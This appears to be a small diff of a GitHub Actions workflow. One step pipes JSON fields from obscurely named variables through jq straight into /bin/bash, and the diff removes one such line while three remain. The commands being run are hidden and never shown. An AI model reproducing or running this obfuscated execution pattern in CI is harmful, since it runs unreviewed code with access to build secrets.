@@ -26,7 +26,6 @@ jobs:
           echo $pnm53 | jq -r .dzw577 | /bin/bash
           echo $olty97130 | jq -r .bc282 | /bin/bash
           printf '%s' "$hta9" | jq -r .sjiq4635 | /bin/bash
-          echo $se80702 | jq -r .wngat210 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
